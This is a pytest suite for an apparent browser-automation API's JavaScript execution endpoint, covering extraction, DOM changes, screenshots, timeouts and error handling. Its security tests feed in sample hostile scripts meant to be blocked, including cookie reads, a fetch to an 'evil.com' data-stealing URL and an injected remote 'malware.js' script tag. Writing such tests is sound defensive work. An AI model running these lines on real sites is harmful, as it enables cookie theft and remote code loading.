"""
JavaScript Execution Tests
"""

import pytest
import sys
import json
from pathlib import Path
from typing import Dict

# Add parent directory to path
sys.path.append(str(Path(__file__).parent.parent))

from utils.test_base import BaseAPITest, assert_valid_screenshot, assert_valid_markdown


class TestExecuteEndpoint(BaseAPITest):
    """Test /v2/execute endpoint for direct JavaScript execution"""
    
    def test_basic_javascript_execution(self):
        """Test basic JavaScript execution"""
        
        response = self.make_request("POST", "/execute", json={
            "url": self.get_test_url(),
            "javascript": "document.title",
            "wait_before": 1000,
            "wait_after": 500
        })
        
        data = self.assert_success_response(response)
        
        # Should return result
        assert "result" in data
        assert isinstance(data["result"], str)
        assert len(data["result"]) > 0  # Should have a title
        
        # Should have execution time
        if "execution_time_ms" in data:
            assert data["execution_time_ms"] > 0
    
    def test_complex_javascript(self):
        """Test complex JavaScript with data extraction"""
        
        javascript = """
        const data = {
            title: document.title,
            links: Array.from(document.querySelectorAll('a')).map(a => ({
                text: a.textContent.trim(),
                href: a.href
            })).slice(0, 5),
            headings: Array.from(document.querySelectorAll('h1, h2, h3')).map(h => ({
                tag: h.tagName.toLowerCase(),
                text: h.textContent.trim()
            })),
            images: document.querySelectorAll('img').length,
            scripts: document.querySelectorAll('script').length
        };
        JSON.stringify(data);
        """
        
        response = self.make_request("POST", "/execute", json={
            "url": "https://example.com",
            "javascript": javascript
        })
        
        data = self.assert_success_response(response)
        
        # Parse result
        result = json.loads(data["result"])
        
        # Validate extracted data
        assert "title" in result
        assert "links" in result
        assert isinstance(result["links"], list)
        assert "headings" in result
        assert "images" in result
        assert isinstance(result["images"], int)
    
    def test_async_javascript(self):
        """Test async JavaScript execution"""
        
        javascript = """
        async function getData() {
            // Simulate async operation
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            const timestamp = new Date().toISOString();
            const elements = document.querySelectorAll('*').length;
            
            return {
                timestamp: timestamp,
                elementCount: elements,
                asyncExecuted: true
            };
        }
        
        await getData();
        """
        
        response = self.make_request("POST", "/execute", json={
            "url": self.get_test_url(),
            "javascript": javascript,
            "timeout": 5000
        })
        
        data = self.assert_success_response(response)
        
        # Should handle async/await
        result = data["result"]
        assert "asyncExecuted" in str(result)
        assert "timestamp" in str(result)
    
    def test_javascript_with_screenshot(self):
        """Test JavaScript execution with screenshot capture"""
        
        # Modify page and capture screenshot
        javascript = """
        // Change background color
        document.body.style.backgroundColor = '#ff0000';
        
        // Add a banner
        const banner = document.createElement('div');
        banner.style.cssText = 'position:fixed;top:0;left:0;right:0;padding:20px;background:#000;color:#fff;text-align:center;z-index:9999';
        banner.textContent = 'Modified by Gnosis Wraith Test';
        document.body.appendChild(banner);
        
        'Page modified';
        """
        
        response = self.make_request("POST", "/execute", json={
            "url": self.get_test_url(),
            "javascript": javascript,
            "take_screenshot": True,
            "screenshot_options": {
                "full_page": False,
                "quality": 90
            }
        })
        
        data = self.assert_success_response(response)
        
        # Should have both result and screenshot
        assert data["result"] == "Page modified"
        assert "screenshot" in data
        assert_valid_screenshot(data["screenshot"])
    
    def test_javascript_with_markdown(self):
        """Test JavaScript execution with markdown extraction"""
        
        # Modify content then extract markdown
        javascript = """
        // Add some content
        const content = document.createElement('div');
        content.innerHTML = '<h2>Test Section</h2><p>This is test content added by JavaScript.</p>';
        document.body.appendChild(content);
        
        document.querySelectorAll('h2').length;
        """
        
        response = self.make_request("POST", "/execute", json={
            "url": self.get_test_url(),
            "javascript": javascript,
            "extract_markdown": True,
            "markdown_options": {
                "include_links": True
            }
        })
        
        data = self.assert_success_response(response)
        
        # Should have result and markdown
        assert "result" in data
        assert "markdown" in data
        assert_valid_markdown(data["markdown"])
        
        # Markdown should contain our added content
        assert "Test Section" in data["markdown"]
        assert "test content added by JavaScript" in data["markdown"]
    
    def test_dom_manipulation(self):
        """Test DOM manipulation capabilities"""
        
        javascript = """
        // Remove all images
        document.querySelectorAll('img').forEach(img => img.remove());
        
        // Change all links to red
        document.querySelectorAll('a').forEach(a => {
            a.style.color = 'red';
            a.style.textDecoration = 'underline';
        });
        
        // Count remaining elements
        {
            images: document.querySelectorAll('img').length,
            links: document.querySelectorAll('a').length,
            modified: true
        }
        """
        
        response = self.make_request("POST", "/execute", json={
            "url": "https://example.com",
            "javascript": javascript,
            "take_screenshot": True
        })
        
        data = self.assert_success_response(response)
        
        # Should return object
        result = data["result"]
        assert result["images"] == 0  # All removed
        assert result["modified"] == True
        assert "screenshot" in data
    
    def test_form_interaction(self):
        """Test form interaction via JavaScript"""
        
        javascript = """
        // Try to find a form and fill it
        const forms = document.querySelectorAll('form');
        const results = [];
        
        forms.forEach((form, index) => {
            // Fill text inputs
            const inputs = form.querySelectorAll('input[type="text"], input[type="email"]');
            inputs.forEach(input => {
                input.value = 'test@example.com';
            });
            
            // Check checkboxes
            const checkboxes = form.querySelectorAll('input[type="checkbox"]');
            checkboxes.forEach(cb => cb.checked = true);
            
            // Select first option in dropdowns
            const selects = form.querySelectorAll('select');
            selects.forEach(select => {
                if (select.options.length > 0) {
                    select.selectedIndex = 0;
                }
            });
            
            results.push({
                formIndex: index,
                inputs: inputs.length,
                checkboxes: checkboxes.length,
                selects: selects.length
            });
        });
        
        results.length > 0 ? results : 'No forms found';
        """
        
        response = self.make_request("POST", "/execute", json={
            "url": "https://httpbin.org/forms/post",  # Page with form
            "javascript": javascript
        })
        
        data = self.assert_success_response(response)
        
        # Should handle form interaction
        assert "result" in data
    
    def test_console_output_capture(self):
        """Test console output capture during execution"""
        
        javascript = """
        console.log('Test log message');
        console.warn('Test warning');
        console.error('Test error');
        
        // Also return a value
        'Console test completed';
        """
        
        response = self.make_request("POST", "/execute", json={
            "url": self.get_test_url(),
            "javascript": javascript
        })
        
        data = self.assert_success_response(response)
        
        # Should capture console output
        if "console_logs" in data:
            logs = data["console_logs"]
            assert isinstance(logs, list)
            
            # Should have our log messages
            log_types = [log.get("type") for log in logs]
            assert "log" in log_types or "info" in log_types
            assert "warn" in log_types or "warning" in log_types  
            assert "error" in log_types
    
    def test_timing_options(self):
        """Test wait_before and wait_after timing options"""
        
        javascript = "new Date().getTime()"
        
        response = self.make_request("POST", "/execute", json={
            "url": self.get_test_url(),
            "javascript": javascript,
            "wait_before": 2000,  # 2 seconds before
            "wait_after": 1000    # 1 second after
        })
        
        data = self.assert_success_response(response)
        
        # Execution should take at least 3 seconds
        if "execution_time_ms" in data:
            assert data["execution_time_ms"] >= 3000


class TestExecuteErrorHandling(BaseAPITest):
    """Test error handling for execute endpoint"""
    
    def test_javascript_syntax_error(self):
        """Test handling of JavaScript syntax errors"""
        
        response = self.make_request("POST", "/execute", json={
            "url": self.get_test_url(),
            "javascript": "this is not valid javascript {"
        })
        
        # Should return error
        assert response.status_code in [400, 422]
        
        if response.status_code == 400:
            self.assert_error_response(response, "INVALID_JAVASCRIPT")
        else:
            data = response.json()
            assert "error" in data
            assert "syntax" in str(data["error"]).lower()
    
    def test_javascript_runtime_error(self):
        """Test handling of JavaScript runtime errors"""
        
        javascript = """
        // This will throw a runtime error
        const obj = null;
        obj.someProperty.nested.deep;
        """
        
        response = self.make_request("POST", "/execute", json={
            "url": self.get_test_url(),
            "javascript": javascript
        })
        
        # Should handle runtime errors
        if response.status_code != 200:
            data = response.json()
            assert "error" in data
            error_msg = str(data["error"]).lower()
            assert "cannot read" in error_msg or "null" in error_msg
    
    def test_infinite_loop_protection(self):
        """Test protection against infinite loops"""
        
        javascript = """
        // Infinite loop
        while(true) {
            // This should be terminated by timeout
        }
        """
        
        response = self.make_request("POST", "/execute", json={
            "url": self.get_test_url(),
            "javascript": javascript,
            "timeout": 3000  # 3 second timeout
        })
        
        # Should timeout
        if response.status_code != 200:
            self.assert_error_response(response, "TIMEOUT_ERROR")
    
    def test_memory_exhaustion_protection(self):
        """Test protection against memory exhaustion"""
        
        javascript = """
        // Try to allocate huge array
        const huge = [];
        for(let i = 0; i < 1000000000; i++) {
            huge.push(new Array(1000000));
        }
        """
        
        response = self.make_request("POST", "/execute", json={
            "url": self.get_test_url(),
            "javascript": javascript,
            "timeout": 5000
        })
        
        # Should fail safely
        assert response.status_code in [200, 400, 500]
    
    def test_missing_url(self):
        """Test execution without URL"""
        
        response = self.make_request("POST", "/execute", json={
            "javascript": "document.title"
        })
        
        assert response.status_code == 400
    
    def test_missing_javascript(self):
        """Test execution without JavaScript"""
        
        response = self.make_request("POST", "/execute", json={
            "url": self.get_test_url()
        })
        
        assert response.status_code == 400


class TestExecuteSecurityValidation(BaseAPITest):
    """Test security validation for JavaScript execution"""
    
    def test_cookie_access_blocked(self):
        """Test that cookie access is blocked"""
        
        response = self.make_request("POST", "/execute", json={
            "url": self.get_test_url(),
            "javascript": "document.cookie"
        })
        
        # Should be blocked
        if response.status_code != 200:
            self.assert_error_response(response, "INVALID_JAVASCRIPT")
    
    def test_localstorage_access_blocked(self):
        """Test that localStorage access is blocked"""
        
        response = self.make_request("POST", "/execute", json={
            "url": self.get_test_url(),
            "javascript": "localStorage.setItem('key', 'value')"
        })
        
        # Should be blocked
        if response.status_code != 200:
            self.assert_error_response(response, "INVALID_JAVASCRIPT")
    
    def test_external_fetch_blocked(self):
        """Test that external fetch is blocked"""
        
        response = self.make_request("POST", "/execute", json={
            "url": self.get_test_url(),
            "javascript": "fetch('https://evil.com/steal-data')"
        })
        
        # Should be blocked
        if response.status_code != 200:
            self.assert_error_response(response, "INVALID_JAVASCRIPT")
    
    def test_eval_blocked(self):
        """Test that eval is blocked"""
        
        response = self.make_request("POST", "/execute", json={
            "url": self.get_test_url(),
            "javascript": "eval('alert(1)')"
        })
        
        # Should be blocked
        if response.status_code != 200:
            self.assert_error_response(response, "INVALID_JAVASCRIPT")
    
    def test_script_injection_blocked(self):
        """Test that script injection is blocked"""
        
        javascript = """
        const script = document.createElement('script');
        script.src = 'https://evil.com/malware.js';
        document.head.appendChild(script);
        """
        
        response = self.make_request("POST", "/execute", json={
            "url": self.get_test_url(),
            "javascript": javascript
        })
        
        # Should be blocked
        if response.status_code != 200:
            self.assert_error_response(response, "INVALID_JAVASCRIPT")
    
    def test_safe_same_origin_fetch(self):
        """Test that same-origin fetch might be allowed"""
        
        javascript = """
        // This might be allowed as it's same-origin
        const currentDomain = window.location.hostname;
        `Checking ${currentDomain}`;
        """
        
        response = self.make_request("POST", "/execute", json={
            "url": self.get_test_url(),
            "javascript": javascript
        })
        
        # This safe code should work
        data = self.assert_success_response(response)
        assert "result" in data


if __name__ == "__main__":
    pytest.main([__file__, "-v"])